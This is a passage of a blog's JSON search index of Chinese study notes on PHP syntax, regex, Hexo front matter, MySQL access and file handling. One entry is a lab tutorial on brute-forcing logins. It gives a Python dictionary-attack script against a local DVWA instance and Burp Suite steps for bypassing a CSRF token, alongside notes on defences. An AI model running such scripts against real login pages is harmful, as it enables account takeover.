&quot;&lt;br&gt;&quot;;\n&#125;\n?&gt;\n\n\n\n关联数组关联数组是使用您分配给数组的指定的键的数组。\n这里有两种创建关联数组的方法\n$age&#x3D;array(&quot;Peter&quot;&#x3D;&gt;&quot;35&quot;,&quot;Ben&quot;&#x3D;&gt;&quot;37&quot;,&quot;Joe&quot;&#x3D;&gt;&quot;43&quot;);\n\nor\n\n$age[&#39;Peter&#39;]&#x3D;&quot;35&quot;;\n$age[&#39;Ben&#39;]&#x3D;&quot;37&quot;;\n$age[&#39;Joe&#39;]&#x3D;&quot;43&quot;;\n\n\n\n&lt;?php\n$age&#x3D;array(&quot;Peter&quot;&#x3D;&gt;&quot;35&quot;,&quot;Ben&quot;&#x3D;&gt;&quot;37&quot;,&quot;Joe&quot;&#x3D;&gt;&quot;43&quot;);\necho &quot;Peter is &quot; . $age[&#39;Peter&#39;] . &quot; years old.&quot;;\n?&gt;\n\n\n\n遍历关联数组遍历并打印关联数组中的所有值，您可以使用 foreach 循环\n&lt;?php\n$age&#x3D;array(&quot;Peter&quot;&#x3D;&gt;&quot;35&quot;,&quot;Ben&quot;&#x3D;&gt;&quot;37&quot;,&quot;Joe&quot;&#x3D;&gt;&quot;43&quot;);\n \nforeach($age as $x&#x3D;&gt;$x_value)\n&#123;\n    echo &quot;Key&#x3D;&quot; . $x . &quot;, Value&#x3D;&quot; . $x_value;\n    echo &quot;&lt;br&gt;&quot;;\n&#125;\n?&gt;\n\n\n\n循环循环执行代码块指定的次数，或者当指定的条件为真时循环执行代码块。\n在 PHP 中，提供了下列循环语句：\n\nwhile - 只要指定的条件成立，则循环执行代码块\ndo…while - 首先执行一次代码块，然后在指定的条件成立时重复这个循环\nfor - 循环执行代码块指定的次数\nforeach - 根据数组中每个元素来循环代码块\n\nwhile 循环while 循环将重复执行代码块，直到指定的条件不成立。\n语法while (条件)\n&#123;\n    要执行的代码;\n&#125;\n\n\n\n实例首先设置变量 i 的值为 1 ($i&#x3D;1;)。\n然后，只要 i 小于或者等于 5，while 循环将继续运行。循环每运行一次，i 就会递增 1：\n&lt;html&gt;\n&lt;body&gt;\n\n&lt;?php\n$i&#x3D;1;\nwhile($i&lt;&#x3D;5)\n&#123;\n    echo &quot;The number is &quot; . $i . &quot;&lt;br&gt;&quot;;\n    $i++;\n&#125;\n?&gt;\n\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\n\n\ndo…while 语句do…while 语句会至少执行一次代码，然后检查条件，只要条件成立，就会重复进行循环。\n语法do\n&#123;\n    要执行的代码;\n&#125;\nwhile (条件);\n\n\n\n实例首先设置变量 i 的值为 1 ($i&#x3D;1;)。\n然后，开始 do…while 循环。循环将变量 i 的值递增 1，然后输出。先检查条件（i 小于或者等于 5），只要 i 小于或者等于 5，循环将继续运行\n&lt;html&gt;\n&lt;body&gt;\n\n&lt;?php\n$i&#x3D;1;\ndo\n&#123;\n    $i++;\n    echo &quot;The number is &quot; . $i . &quot;&lt;br&gt;&quot;;\n&#125;\nwhile ($i&lt;&#x3D;5);\n?&gt;\n\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\nFor 循环for 循环用于您预先知道脚本需要运行的次数的情况。\n语法for (初始值; 条件; 增量)\n&#123;\n    要执行的代码;\n&#125;\n\n参数：\n\n初始值：主要是初始化一个变量值，用于设置一个计数器（但可以是任何在循环的开始被执行一次的代码）。\n条件：循环执行的限制条件。如果为 TRUE，则循环继续。如果为 FALSE，则循环结束。\n增量：主要用于递增计数器（但可以是任何在循环的结束被执行的代码）。\n\n注释：上面的初始值和增量参数可为空，或者有多个表达式（用逗号分隔）。\n实例下面的实例定义一个初始值为 i&#x3D;1 的循环。只要变量 i 小于或者等于 5，循环将继续运行。循环每运行一次，变量 i 就会递增 1\n&lt;?php\nfor ($i&#x3D;1; $i&lt;&#x3D;5; $i++)\n&#123;\n    echo &quot;数字为 &quot; . $i;\n&#125;\n?&gt;\n\n\n\nforeach 循环foreach 循环用于遍历数组。\n语法foreach ($array as $value)\n&#123;\n    要执行代码;\n&#125;\n\n每进行一次循环，当前数组元素的值就会被赋值给 $value 变量（数组指针会逐一地移动），在进行下一次循环时，您将看到数组中的下一个值。\nforeach ($array as $key &#x3D;&gt; $value)\n&#123;\n    要执行代码;\n&#125;\n\n每一次循环，当前数组元素的键与值就都会被赋值给 $key 和 $value 变量（数字指针会逐一地移动），在进行下一次循环时，你将看到数组中的下一个键与值。\n&lt;?php\n$x&#x3D;array(&quot;Google&quot;,&quot;Runoob&quot;,&quot;Taobao&quot;);\nforeach ($x as $value)\n&#123;\n    echo $value . PHP_EOL;\n&#125;\n?&gt;\n\n\n\n&lt;?php\n$x&#x3D;array(1&#x3D;&gt;&quot;Google&quot;, 2&#x3D;&gt;&quot;Runoob&quot;, 3&#x3D;&gt;&quot;Taobao&quot;);\nforeach ($x as $key &#x3D;&gt; $value)\n&#123;\n    echo &quot;key  为 &quot; . $key . &quot;，对应的 value 为 &quot;. $value . PHP_EOL;\n&#125;\n?&gt;\n\n\n\n函数创建 PHP 函数函数是通过调用函数来执行的。\n&lt;?php\nfunction functionName()\n&#123;\n    &#x2F;&#x2F; 要执行的代码\n&#125;\n?&gt;\n\n函数准则：\n\n函数的名称应该提示出它的功能\n函数名称以字母或下划线开头（不能以数字开头）\n\n&lt;?php\nfunction writeName()\n&#123;\n    echo &quot;Kai Jim Refsnes&quot;;\n&#125;\n \necho &quot;My name is &quot;;\nwriteName();\n?&gt;\n\n\n\n函数 - 添加参数为了给函数添加更多的功能，我们可以添加参数，参数类似变量。\n参数就在函数名称后面的一个括号内指定。\n&lt;?php\nfunction writeName($fname)\n&#123;\n    echo $fname . &quot; Refsnes.&lt;br&gt;&quot;;\n&#125;\n \necho &quot;My name is &quot;;\nwriteName(&quot;Kai Jim&quot;);\necho &quot;My sister&#39;s name is &quot;;\nwriteName(&quot;Hege&quot;);\necho &quot;My brother&#39;s name is &quot;;\nwriteName(&quot;Stale&quot;);\n?&gt;\n\n\n\n&lt;?php\nfunction writeName($fname,$punctuation)\n&#123;\n    echo $fname . &quot; Refsnes&quot; . $punctuation . &quot;&lt;br&gt;&quot;;\n&#125;\n \necho &quot;My name is &quot;;\nwriteName(&quot;Kai Jim&quot;,&quot;.&quot;);\necho &quot;My sister&#39;s name is &quot;;\nwriteName(&quot;Hege&quot;,&quot;!&quot;);\necho &quot;My brother&#39;s name is &quot;;\nwriteName(&quot;Ståle&quot;,&quot;?&quot;);\n?&gt;\n\n\n\n函数 - 返回值如需让函数返回一个值，请使用 return 语句\n&lt;?php\nfunction add($x,$y)\n&#123;\n    $total&#x3D;$x+$y;\n    return $total;\n&#125;\n \necho &quot;1 + 16 &#x3D; &quot; . add(1,16);\n?&gt;\n\n\n\n","slug":"01PHP基础","date":"2022-11-11T10:11:42.437Z","categories_index":"学习笔记","tags_index":"php","author_index":"Abyssaler"},{"id":"bd6f30a22217917d2172ab3a5accd3dc","title":"PHP正则表达式","content":"正则表达式正则表达式存在的意义：过滤和检索。\n正则表达式，又称规则表达式（Regular Expression ）常简写为regex，regexp，RE;\n作用正则表达式通常被用来检索、替换符合规则的文本\n特点\n灵活性、逻辑性和功能性强\n可以快速地用极简单的方式达到支付出的复杂控制\n\n用途\n判断字符串是否符合某规则\n从一个字符串中找出符合规则的所以子字符串\n\n常用字符\n\n\n说明\n符号\n\n\n\n数字\n\\d\n\n\n非字符\n\\D\n\n\n空白字符（空格、制表符、换页符等）\n\\s\n\n\n非空白字符\n\\S\n\n\n制表符\n\\t\n\n\n回车符\n\\r\n\n\n换行符\n\\n\n\n\n单词字符（26个英文字母+数字+下划线）\n\\w\n\n\n非单词字符\n\\W\n\n\n字符集合字符集合：[ 单个字符或字符区间] ，用于匹配集合内字符\n\n如：\n\n[a-z]    表示a-z   26个小写字母\n[ 0-9a-h] 表示0-9 10个数字和a-z 8个字母\n[134a-h] 表示包含数字1，3，5和字母a-h 8个字母\n\n注意：两个不同字符段间请勿使用逗号，隔开\n反选字符非集：[\\^单个字符或区间]，用于匹配非集合内字符]\n\n\n反选字符：^\t\n\n[^]  注意：中括号内^ 才是反选\n\n[^0-9]  表示匹配所有非数字字符\n\n[^a-zA-Z] 表示匹配所有非字母字符\n\n\n关键字\n\n\n关键字\n描述\n\n\n\n^\n匹配输入字符串的开始位置\n\n\n$\n匹配输入字符串的结尾位置\n\n\n（）\n标记一个子表达式的开始和结束位置\n\n\n*\n匹配前面的子表达式零次或多次\n\n\n+\n匹配前面的子表达式一次或多次\n\n\n.\n匹配除换行符\\n之外的任意单个字符\n\n\n[\n标记一个中括号表达式的开始\n\n\n？\n匹配前面的子表达式零次或一次\n\n\n\\\n将下一个字符标记为特殊字符原来的本意\n\n\n{\n标记限定符表达式的开始\n\n\n|\n指明两项之间的一项\n\n\n限定符\n\n\n字符\n描述\n\n\n\n{n}\nn为非负数，匹配连续的字符n次\n\n\n{n,}\nn为非负数，匹配连续的字符n次及以上\n\n\n{n，m}\nn、m均为非负数，n &lt;&#x3D;m,匹配连续的字符 至少n次，至多m次\n\n\n修饰符​\t\n\n\n\n修饰符\n描述\n\n\n\n&#x2F;i\n不区分大小写\n\n\n&#x2F;A\n匹配规则必须从头开始匹配\n\n\n&#x2F;s\n将匹配一切字符\n\n\n&#x2F;X\n正则表达式中的空白字符将会被忽略\n\n\n注意：写在正则表达式的“外面“    &#x2F;a&#x2F;i\n函数PHP中使用正则表达式一定要加&#x2F; 正则表达式内容  &#x2F;\n\npreg_match(正则表达式，匹配的字符串)\n匹配第一个匹配正则的子字符串，未找到返回0.找到返回1\n\npreg_grep()\n匹配第一个匹配正则的字符串数组，包含匹配的字符串和匹配的单元\n\npreg_match_all(正则表达式，匹配的字符串，输出的二维数组)\n能匹配所有的子字符串，返回子字符串匹配的数量\n\npre_replace(正则表达式，替换的字符串，匹配的字符串)\n将所有匹配正则表达式的字符串进行替换\n\n\n","slug":"06PHP正则表达式","date":"2022-11-11T09:18:48.428Z","categories_index":"学习笔记","tags_index":"php","author_index":"Abyssaler"},{"id":"768203e0c226cf15b0e3763fb1a90bc7","title":"暴力破解思路","content":"WEB漏洞：暴力破解密码爆破的本质：依赖字典，连续性的，自动化的尝试密码登陆爆破\n1）密码爆破思路方式一：尝试爆破：假设密码长度6，每位有126种可能。那么需要尝试126^6次。\n\n方式二：使用字典​     思考：字典从何而来？ \n参考泄露出来的最长使用的密码排名前200：\nhttps:&#x2F;&#x2F;nordpass.com&#x2F;most-common-passwords-list&#x2F;\n网络下载密码本\n密码生成器\n\n\n​      \n方式三：使用POC实现爆破POC实现爆破，python代码实现爆破：\n1、读取字典，加载密码\n2、发起http连接\n3、分析HTTP响应\n4、持续自动化爆破\n\n代码：\nreadpass.py\n# -*- coding: utf-8 -*-\n# python 3\n\npwds &#x3D; open(&quot;password.txt&quot;)\nfor pwd in pwds:\n    print(pwd)\n\npwds.close()\n\nhttpconn.py\n# -*- coding: utf-8 -*-\n# python 3\n\nimport requests\n\npwds &#x3D; open(&quot;password.txt&quot;)\nfor pwd in pwds:\n    url &#x3D; &quot;http:&#x2F;&#x2F;localhost&#x2F;DVWA-master&#x2F;vulnerabilities&#x2F;brute&#x2F;&quot;\n    # PHPSESSID务必替换为登录以后的PHPSESSID\n    resp &#x3D; requests.get(url &#x3D; url, params &#x3D; &#123;&quot;username&quot;:&quot;admin&quot;, &quot;password&quot;:pwd.strip(), &quot;Login&quot;:&quot;Login&quot;&#125;, headers &#x3D; &#123;&quot;Cookie&quot;:&quot;security&#x3D;low; PHPSESSID&#x3D;0hhidoi7h1ln7jo9h2h0tgfnn6&quot;&#125;)\n    #print(resp.text)\n    if &#39;Username and&#x2F;or password incorrect.&#39; in resp.text:\n        print(&#39;破解失败：&#39;+pwd, end&#x3D;&#39;&#39;)\n    else:\n        print(&#39;破解成功：&#39;+pwd, end&#x3D;&#39;&#39;)\n        break;\npwds.close()\n\n2） DVWA靶场环境准备：下载代码： https://dvwa.co.uk/\n配置数据库：修改config&#x2F;config.inc.php\n部署到phpstudy\n注意是登录以后才可以使用暴破场景，而不是暴破首页的登录功能\n3）暴力破解实现使用python代码破解DVWA靶场使用工具BP实现爆破4）BP的攻击模式攻击模式一：狙击手\n发起爆破：\n\n攻击结果：\n\n攻击模式二：攻城锤Battering ram\n\n攻城锤模式，使用一个字典，两个节点的值一样：\n\n攻击模式三：草叉模式Pitchfork\n选择两个字典：\n\n\n攻击结果：一共发起10次请求，每一次请求使用第一个字典的第一个值和第二个字典的第一个值匹配，依次类推：\n\n攻击模式四：集束炸弹Cluster bomb\n使用两个字典：\n\n\n攻击结果：笛卡尔积，一共发起100次请求，爆破成功：\n\n5）防御DVWA-medium  ：sleep两秒\nDVWA-high: 随机sleep 0-3秒   ，  增加CSRF token（客户端请求伪造token）\nBP拦截：\n\n选择草叉模式：\n\n加载第一个字典：\n\n第二个参数，是需要从上一次请求中的token种得到：\n设置Options：匹配到前后的正则表达式，那么就是token：\n\n设置payloads：\n\n设置单线程：\n\n爆破结果：\n\n添加提示：\n\n点击Add：\n\n爆破结果：\n\nDvwa-impossible：限定次数：输错三次，锁定15分钟\n支付宝设置的防御机制：\n\n二次验证加固：\n\n人机识别加固：\n\n\n","slug":"暴力破解","date":"2022-11-11T01:21:04.000Z","categories_index":"学习笔记","tags_index":"密码破解","author_index":"Abyssaler"},{"id":"677084f9c18037c17104fff897e28f62","title":"Front-Meta属性","content":"Aurora中文章的Front-Meta属性新建文章配置\n\n\n配置选项\n默认值\n描述\n\n\n\ntitle\nMarkdown 的文件标题\n文章标题，强烈建议填写此选项\n\n\ndate\n文件创建时的日期时间\n发布时间，强烈建议填写此选项，且最好保证全局唯一\n\n\nauthor\n根 _config.yml 中的 author\n文章作者\n\n\nimg\nfeatureImages 中的某个值\n文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.\n\n\ntop\ntrue\n推荐文章（文章是否置顶），如果 top 值为 true，则会作为首页推荐文章\n\n\ncover\nfalse\nv1.0.2版本新增，表示该文章是否需要加入到首页轮播封面中\n\n\ncoverImg\n无\nv1.0.2版本新增，表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片\n\n\npassword\n无\n文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 password 的值，该值必须是用 SHA256 加密后的密码，防止被他人识破。前提是在主题的 config.yml 中激活了 verifyPassword 选项\n\n\ntoc\ntrue\n是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 config.yml 中激活了 toc 选项\n\n\nmathjax\nfalse\n是否开启数学公式支持 ，本文章是否开启 mathjax，且需要在主题的 _config.yml 文件中也需要开启才行\n\n\nsummary\n无\n文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要\n\n\ncategories\n无\n文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类\n\n\ntags\n无\n文章标签，一篇文章可以多个标签\n\n\n更多markdown语法参考:\n\n\n\n\n\n\n\n\n\nhttps://github.com/Sakiyary/Markdown-Typora-VSCode-Doc\n","slug":"文章开头格式","date":"2022-11-10T14:13:43.591Z","categories_index":"环境配置","tags_index":"markdown","author_index":"Abyssaler"},{"id":"e8eeb095a66f2218f43f6c5e63475a56","title":"PHP连接mysql数据库","content":"通过 PHP，您可以连接和操作数据库。\n连接 MySQL在我们访问 MySQL 数据库前，我们需要先连接到数据库服务器\n(MySQLi - 面向对象）&lt;?php\n$servername &#x3D; &quot;localhost&quot;;\n$username &#x3D; &quot;username&quot;;\n$password &#x3D; &quot;password&quot;;\n \n&#x2F;&#x2F; 创建连接\n$conn &#x3D; new mysqli($servername, $username, $password);\n \n&#x2F;&#x2F; 检测连接\nif ($conn-&gt;connect_error) &#123;\n    die(&quot;连接失败: &quot; . $conn-&gt;connect_error);\n&#125; \necho &quot;连接成功&quot;;\n?&gt;\n\n注意： 注意在以上面向对象的实例中 $connect_error 是在 PHP 5.2.9 和 5.3.0 中添加的。如果你需要兼容更早版本 请使用以下代码替换:  &#x2F;&#x2F; 检测连接 if (mysqli_connect_error()) {   die(“数据库连接失败: “ . mysqli_connect_error()); }\nMySQLi - 面向过程&lt;?php\n$servername &#x3D; &quot;localhost&quot;;\n$username &#x3D; &quot;username&quot;;\n$password &#x3D; &quot;password&quot;;\n \n&#x2F;&#x2F; 创建连接\n$conn &#x3D; mysqli_connect($servername, $username, $password);\n \n&#x2F;&#x2F; 检测连接\nif (!$conn) &#123;\n    die(&quot;Connection failed: &quot; . mysqli_connect_error());\n&#125;\necho &quot;连接成功&quot;;\n?&gt;\n\n\n\nPDO&lt;?php\n$servername &#x3D; &quot;localhost&quot;;\n$username &#x3D; &quot;username&quot;;\n$password &#x3D; &quot;password&quot;;\n \ntry &#123;\n    $conn &#x3D; new PDO(&quot;mysql:host&#x3D;$servername;&quot;, $username, $password);\n    echo &quot;连接成功&quot;; \n&#125;\ncatch(PDOException $e)\n&#123;\n    echo $e-&gt;getMessage();\n&#125;\n?&gt;\n\n\n\n\n\nMySQL基础知识链接\n连接数据库\n实例：&lt;?php\n    &#x2F;&#x2F; 创建连接\n&#x2F;&#x2F; $conn &#x3D; mysqli_connect($servername, $username, $password);\n    $conn &#x3D; mysqli_connect(&#39;localhost&#39;, &#39;root&#39;,&#39;root&#39;);\n\n    &#x2F;&#x2F; 检测连接\n    if(!$conn)&#123;\n        die(mysqli_connect_error());\n    &#125;\n    echo &quot;连接成功&quot;;\n\n    &#x2F;&#x2F;关闭连接\n    mysqli_close($conn); \n?&gt;\n\n创建数据库\n数据库存有一个或者多个表\n需要create 权限来创建或删除MySQL数据库\n创建数据库语句：create database name\n实例：&lt;?php\n    &#x2F;&#x2F; 创建连接\n&#x2F;&#x2F; $conn &#x3D; mysqli_connect($servername, $username, $password);\n    $conn &#x3D; mysqli_connect(&#39;localhost&#39;, &#39;root&#39;,&#39;root&#39;);\n\n    &#x2F;&#x2F; 检测连接\n    if(!$conn)&#123;\n        die(mysqli_connect_error());\n    &#125;\n    echo &quot;连接成功&quot;;\n    echo &quot;&lt;br&gt;&quot;;\n\n    &#x2F;&#x2F; 创建数据库语句\n    $sql &#x3D; &quot;CREATE DATABASE PHP&quot;; &#x2F;&#x2F; 创建一个PHP数据库\n\n    &#x2F;&#x2F; mysqli_query() 向MySQL数据库执行一条语句\n    if(mysqli_query($conn,$sql))&#123;\n        echo &quot;创建数据库 PHP成功&quot;;\n        &#125;\n    else&#123;\n        echo mysqli_error($conn);\n    &#125;\n\n    &#x2F;&#x2F;关闭连接\n    mysqli_close($conn); \n?&gt;\n运行后查看数据库是否添加\n\n创建数据表\n创建表的语句：create table \n实例：&lt;?php\n    &#x2F;&#x2F; 创建连接\n&#x2F;&#x2F; $conn &#x3D; mysqli_connect($servername, $username, $password);\n    $conn &#x3D; mysqli_connect(&#39;localhost&#39;, &#39;root&#39;,&#39;root&#39;,&#39;PHP&#39;);\n\n    &#x2F;&#x2F; 检测连接\n    if(!$conn)&#123;\n        die(mysqli_connect_error());\n    &#125;\n    else&#123;\n        echo &quot;连接成功&quot;;\n        echo &quot;&lt;br&gt;&quot;;\n    &#125;\n\n    &#x2F;&#x2F; 创建数据表语句\n    $sql &#x3D; &quot;create table MyGuests (\n        id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY, \n        firstname VARCHAR(30) NOT NULL,\n        lastname VARCHAR(30) NOT NULL,\n        email VARCHAR(50),\n        reg_date TIMESTAMP\n        )&quot;;\n     \n     &#x2F;&#x2F;向数据库执行sql语句\n     if(mysqli_query($conn,$sql))&#123;\n        echo &quot;创建数据表成功&quot;;\n        echo &quot;&lt;br&gt;&quot;;\n     &#125; \n     else&#123;echo mysqli_error($conn);&#125;\n\n\n    &#x2F;&#x2F;关闭连接\n    mysqli_close($conn); \n?&gt;\n运行截图数据库中的信息\n\n插入数据\n语法：insert into\n实例：&lt;?php\n    &#x2F;&#x2F; 创建连接\n&#x2F;&#x2F; $conn &#x3D; mysqli_connect($servername, $username, $password);\n    $conn &#x3D; mysqli_connect(&#39;localhost&#39;, &#39;root&#39;,&#39;root&#39;,&#39;PHP&#39;);\n\n    &#x2F;&#x2F; 检测连接\n    if(!$conn)&#123;\n        die(mysqli_connect_error());\n    &#125;\n    else&#123;\n        echo &quot;连接成功&quot;;\n        echo &quot;&lt;br&gt;&quot;;\n    &#125;\n\n    &#x2F;&#x2F; 创建插入语句\n    $sql &#x3D; &quot;INSERT INTO MyGuests (firstname, lastname, email) VALUES (&#39;John&#39;, &#39;Doe&#39;, &#39;john@example.com&#39;)&quot;;\n\n    &#x2F;&#x2F; 执行语句\n    if(mysqli_query($conn,$sql))&#123;\n        echo &quot;数据插入成功&quot;;\n    &#125;\n    else&#123;echo mysqli_error($conn);&#125;\n\n    &#x2F;&#x2F;关闭连接\n    mysqli_close($conn); \n?&gt;\n运行截图数据库中的信息\n\n插入多条数据\nmysqli_multi_query() 函数可用来执行多条SQL语句\n实例：&lt;?php\n    &#x2F;&#x2F; 创建连接\n&#x2F;&#x2F; $conn &#x3D; mysqli_connect($servername, $username, $password);\n    $conn &#x3D; mysqli_connect(&#39;localhost&#39;, &#39;root&#39;,&#39;root&#39;,&#39;PHP&#39;);\n\n    &#x2F;&#x2F; 检测连接\n    if(!$conn)&#123;\n        die(mysqli_connect_error());\n    &#125;\n    else&#123;\n        echo &quot;连接成功&quot;;\n        echo &quot;&lt;br&gt;&quot;;\n    &#125;\n\n    &#x2F;&#x2F; 创建插入语句\n    $sql &#x3D; &quot;INSERT INTO MyGuests (firstname, lastname, email) VALUES (&#39;pual&#39;, &#39;bei&#39;, &#39;pual@example.com&#39;);&quot;;\n    $sql .&#x3D; &quot;INSERT INTO MyGuests (firstname, lastname, email) VALUES (&#39;Mary&#39;, &#39;Moe&#39;, &#39;mary@example.com&#39;);&quot;;\n    $sql .&#x3D; &quot;INSERT INTO MyGuests (firstname, lastname, email) VALUES (&#39;Julie&#39;, &#39;Dooley&#39;, &#39;julie@example.com&#39;)&quot;;\n\n    &#x2F;&#x2F; 一次性插入多条语句\n    if(mysqli_multi_query($conn,$sql))&#123;\n        echo &quot;添加记录成功&quot;;\n    &#125;\n    else&#123;echo mysqli_connect_error;&#125;\n\n    &#x2F;&#x2F;关闭连接\n    mysqli_close($conn); \n?&gt;\n运行截图数据库中的信息\n\n读取数据\nmysqli_num_rows() ：返回sql语句查询到的总行数\n\nmysqli_fetch_assoc() 函数从结果集中取得一行作为关联数组\n\n实例：\n&lt;?php\n    &#x2F;&#x2F; 创建连接\n&#x2F;&#x2F; $conn &#x3D; mysqli_connect($servername, $username, $password);\n    $conn &#x3D; mysqli_connect(&#39;localhost&#39;, &#39;root&#39;,&#39;root&#39;,&#39;PHP&#39;);\n\n    &#x2F;&#x2F; 检测连接\n    if(!$conn)&#123;\n        die(mysqli_connect_error());\n    &#125;\n    else&#123;\n        echo &quot;连接成功&quot;;\n        echo &quot;&lt;br&gt;&quot;;\n    &#125;\n\n    &#x2F;&#x2F; 创建查询语句\n    $sql &#x3D; &quot;select id, firstname, lastname from MyGuests&quot;;\n    \n    $res &#x3D; mysqli_query($conn,$sql);\n\n    &#x2F;&#x2F; 返回sql语句查询到的总行数\n    &#x2F;&#x2F; mysqli_num_rows($res)\n\n    if(mysqli_num_rows($res) &gt; 0)&#123;\n        while($row &#x3D; mysqli_fetch_assoc($res))&#123;\n            echo &quot;id:&quot; . $row[&quot;id&quot;] . &quot;-name:&quot; . $row[&quot;firstname&quot;] . &quot; &quot; .$row[&#39;lastname&#39;].&quot;&lt;br&gt;&quot;;\n        &#125;\n    &#125;\n\n    &#x2F;&#x2F;关闭连接\n    mysqli_close($conn); \n?&gt;\n运行截图\n\nmysqli_fetch_assoc()函数和mysqli_num_rows()函数的测试代码\n&lt;?php\n    &#x2F;&#x2F; 创建连接\n&#x2F;&#x2F; $conn &#x3D; mysqli_connect($servername, $username, $password);\n    $conn &#x3D; mysqli_connect(&#39;localhost&#39;, &#39;root&#39;,&#39;root&#39;,&#39;PHP&#39;);\n\n    &#x2F;&#x2F; 检测连接\n    if(!$conn)&#123;\n        die(mysqli_connect_error());\n    &#125;\n    else&#123;\n        echo &quot;连接成功&quot;;\n        echo &quot;&lt;br&gt;&quot;;\n    &#125;\n\n    &#x2F;&#x2F; 创建查询语句\n    $sql &#x3D; &quot;select id, firstname, lastname from MyGuests&quot;;\n    \n    $res &#x3D; mysqli_query($conn,$sql);\n\n    &#x2F;&#x2F; 返回sql语句查询到的总行数\n    $row &#x3D; mysqli_num_rows($res) . &quot;&lt;br&gt;&quot;;\n\n    &#x2F;&#x2F; mysqli_fetch_assoc() 函数从结果集中取得一行作为关联数组\n\n    if($row &gt; 0)&#123;\n        while($i &#x3D; mysqli_fetch_assoc($res))&#123;\n            var_dump($i);\n            echo &quot;&lt;br&gt;&quot;;\n            \n            echo &quot;序列号为：&quot; . $i[&#39;id&#39;] . &quot;, firstname为：&quot; . $i[&#39;firstname&#39;] . &quot;, lastname为：&quot; . $i[&#39;lastname&#39;];\n            echo &quot;&lt;hr&gt;&quot;;\n        &#125;\n    &#125;\n\n\n    &#x2F;&#x2F;关闭连接\n    mysqli_close($conn); \n?&gt;\n\n","slug":"04PHP连接MySQL数据库","date":"2022-11-10T11:28:27.559Z","categories_index":"学习笔记","tags_index":"php","author_index":"Abyssaler"},{"id":"e635c3e685c2a214ead8e396e5b6c265","title":"PHP文件","content":"文件处理fopen() 函数用于在 PHP 中打开文件。\n打开文件fopen() 函数用于在 PHP 中打开文件。\n此函数的第一个参数含有要打开的文件的名称，第二个参数规定了使用哪种模式来打开文件：\n&lt;html&gt;\n&lt;body&gt;\n\n&lt;?php\n$file&#x3D;fopen(&quot;welcome.txt&quot;,&quot;r&quot;);\n?&gt;\n\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\n文件可能通过下列模式来打开：\n\n\n\n模式\n描述\n\n\n\nr\n只读。在文件的开头开始。\n\n\nr+\n读&#x2F;写。在文件的开头开始。\n\n\nw\n只写。打开并清空文件的内容；如果文件不存在，则创建新文件。\n\n\nw+\n读&#x2F;写。打开并清空文件的内容；如果文件不存在，则创建新文件。\n\n\na\n追加。打开并向文件末尾进行写操作，如果文件不存在，则创建新文件。\n\n\na+\n读&#x2F;追加。通过向文件末尾写内容，来保持文件内容。\n\n\nx\n只写。创建新文件。如果文件已存在，则返回 FALSE 和一个错误。\n\n\nx+\n读&#x2F;写。创建新文件。如果文件已存在，则返回 FALSE 和一个错误。\n\n\n注释：如果 fopen() 函数无法打开指定文件，则返回 0 (false)\n如果 fopen() 函数不能打开指定的文件，下面的实例会生成一段消息\n&lt;html&gt;\n&lt;body&gt;\n\n&lt;?php\n$file&#x3D;fopen(&quot;welcome.txt&quot;,&quot;r&quot;) or exit(&quot;Unable to open file!&quot;);\n?&gt;\n\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\n\n\n关闭文件fclose() 函数用于关闭打开的文件\n&lt;?php\n$file &#x3D; fopen(&quot;test.txt&quot;,&quot;r&quot;);\n\n&#x2F;&#x2F;执行一些代码\n\nfclose($file);\n?&gt;\n\n\n\n逐行读取文件fgets() 函数用于从文件中逐行读取文件。\n注释：在调用该函数之后，文件指针会移动到下一行。\n&lt;?php\n$file &#x3D; fopen(&quot;welcome.txt&quot;, &quot;r&quot;) or exit(&quot;无法打开文件!&quot;);\n&#x2F;&#x2F; 读取文件每一行，直到文件结尾\nwhile(!feof($file))\n&#123;\n    echo fgets($file). &quot;&lt;br&gt;&quot;;\n&#125;\nfclose($file);\n?&gt;\n\n\n\n逐字符读取文件fgetc() 函数用于从文件中逐字符地读取文件。\n注释：在调用该函数之后，文件指针会移动到下一个字符。\n实例下面的实例逐字符地读取文件，直到文件末尾为止\n&lt;?php\n$file&#x3D;fopen(&quot;welcome.txt&quot;,&quot;r&quot;) or exit(&quot;无法打开文件!&quot;);\nwhile (!feof($file))\n&#123;\n    echo fgetc($file);\n&#125;\nfclose($file);\n?&gt;\n\n\n\n\n\n\n\n文件上传表单通过 PHP，可以把文件上传到服务器\ntest 项目下完成，目录结构为：\ntest\n|-----upload             # 文件上传的目录\n|-----form.html          # 表单文件\n|-----upload_file.php    # php 上传代码\n\n\n\n创建一个文件上传表单form.html\n&lt;html&gt;\n&lt;head&gt;\n&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;\n&lt;title&gt;表单&lt;&#x2F;title&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n\n&lt;form action&#x3D;&quot;upload_file.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;\n    &lt;label for&#x3D;&quot;file&quot;&gt;文件名：&lt;&#x2F;label&gt;\n    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; id&#x3D;&quot;file&quot;&gt;&lt;br&gt;\n    &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;\n&lt;&#x2F;form&gt;\n\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\n\n\n创建上传脚本“upload_file.php” 文件含有供上传文件的代码\n&lt;?php\nif ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)\n&#123;\n    echo &quot;错误：&quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br&gt;&quot;;\n&#125;\nelse\n&#123;\n    echo &quot;上传文件名: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br&gt;&quot;;\n    echo &quot;文件类型: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . 